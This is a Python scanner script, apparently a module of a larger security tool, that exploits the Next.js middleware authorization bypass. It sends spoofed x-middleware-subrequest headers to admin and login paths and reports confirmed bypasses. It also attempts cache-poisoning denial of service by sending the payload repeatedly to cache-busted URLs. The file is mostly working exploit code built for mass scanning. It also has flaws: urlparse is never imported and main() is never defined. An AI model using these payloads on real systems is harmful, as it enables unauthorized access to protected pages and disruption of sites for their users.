#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
"""

from modules.utils import requests, random, sys, configure_logger, re, Identify

logger = configure_logger(__name__)

from bs4 import BeautifulSoup
from urllib.parse import urljoin


requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


middleware_names = [
    'middleware',
    'pages/_middleware',
    'pages/dashboard/_middleware',
    'pages/dashboard/panel/_middleware',
    'src/middleware',
    'middleware:middleware:middleware:middleware:middleware',
    'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
]

paths = [
    '',
    'login',
    'admin',
    'admin/login',
    'administrator',
    'administration/',
    'administration/dashboard/',
    'administration/dashboard/products',
    'panel',
    'admin.php',
    'dashboard',
    'api/secret',
]


def is_authentication_page(html):
    soup = BeautifulSoup(html, 'html.parser')
    body_text = soup.get_text(" ", strip=True)
    
    auth_keywords = re.compile(r"(identifiant|login|username|user|passwd|pass|password|connexion|authentification|signin|auth|log in|log-in|admin)", re.IGNORECASE)
    
    return bool(auth_keywords.search(body_text))


def follow_redirects(url):
    try:
        req_redir = requests.get(url, verify=False, timeout=10, allow_redirects=True)
        #print(is_authentication_page(req_redir.text))
        if is_authentication_page(req_redir.text):
            #print(req_redir.headers)
            return True
        else:
            return False
    except requests.RequestException as e:
        pass


def bypass_auth(url_p, req):
    for middleware_name in middleware_names:
        headers = {
        'User-Agent': 'Mozilla/5.0',
        'x-middleware-subrequest': middleware_name
        }
        try:
            req_bypass = requests.get(url_p, headers=headers, verify=False, timeout=10, allow_redirects=False)
            #print(f"{url_p} :: {req_bypass}")                  
            if req_bypass.status_code not in range(300, 500) and req_bypass.status_code != req.status_code:
                print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | BYPASS {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | \033[34m{url_p}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
        except Exception as e:
            #traceback.print_exc()
            pass


def detect_response(url, req_main, headers):
    if re.search(r'\/([^/]+(?:\.[a-z]+)?|[^/]+$)', url):
        if req_main.status_code in range(300, 310):
            fr = follow_redirects(url)
            #print(fr)
            if fr:
                bypass_auth(url, req_main)
            elif req_main.status_code in [401, 403]:
                bypass_auth(url, req_main)
        parsed_url = urlparse(url)
        url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
    for path in paths:
        url_p = url + path
        req_check = requests.get(url_p, headers=headers, verify=False, timeout=10, allow_redirects=False)
        try:
            if req_check.status_code in range(300, 310):
                #print(f"{url} :: {follow_redirects(url)}")
                if follow_redirects(url):
                    bypass_auth(url_p, req_check)
            elif req_check.status_code in [401, 403]:
                bypass_auth(url_p, req_check)
        except Exception as e:
            #traceback.print_exc()
            pass


def cache_p(url, req_main, headers):
    url_cb = f"{url}?cb=1234"
    try:
        req_cb = requests.get(url_cb, headers=headers, verify=False, timeout=10, allow_redirects=False)
        if req_cb.status_code in [307, 308, 304, 301, 302]:
            for middleware_name in middleware_names:
                headers = {
                    'User-Agent': 'Mozilla/5.0',
                    'x-middleware-subrequest': middleware_name
                    }
                url_cp = f"{url}?cb={random.randrange(999)}"
                req_cp = requests.get(url_cp, headers=headers, verify=False, timeout=10, allow_redirects=False)
                if req_cp.status_code not in [307, 308, 304, 301, 302]:
                    print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
                    for _ in range(0, 5):
                        requests.get(url_cp, headers=headers, verify=False, timeout=10, allow_redirects=False)
                    req_cp_verify = requests.get(url_cp, verify=False, timeout=10, allow_redirects=False)
                    if req_cp.status_code == req_cp_verify.status_code:
                        print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {req_cb.status_code} > {req_cp.status_code} | \033[34m{url_cp}\033[0m | PAYLOAD: x-middleware-subrequest: {middleware_name}")
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #traceback.print_exc()
        pass


def middleware(url):
    try:
        req_main = requests.get(url, headers=headers, verify=False, timeout=10, allow_redirects=False)
        detect_response(url, req_main, headers)
        cache_p(url, req_main, headers)
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #traceback.print_exc()
        logger.exception(e)
        pass


if __name__ == "__main__":
    # file => python3 file.py f file.txt | single url => python3 file.py url.com
    headers = {
                'User-Agent': 'Mozilla/5.0',
                'Accept-Encoding': 'gzip'
            }


    if len(sys.argv) == 2:
        url = sys.argv[1]
        parsed_url = urlparse(url)
        if parsed_url.scheme == "http" or parsed_url.scheme == "https":
            print(url)
            main(url)
        else:
            print("Usage:\n With file => python3 file.py f file.txt \n With single url => python3 file.py url.com")
    elif len(sys.argv) == 3:
        input_file = sys.argv[2]
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            main(url)
            print(f" {url}", end='\r')
    else:
        print("Usage:\n With file => python3 file.py f file.txt \n With single url => python3 file.py url.com")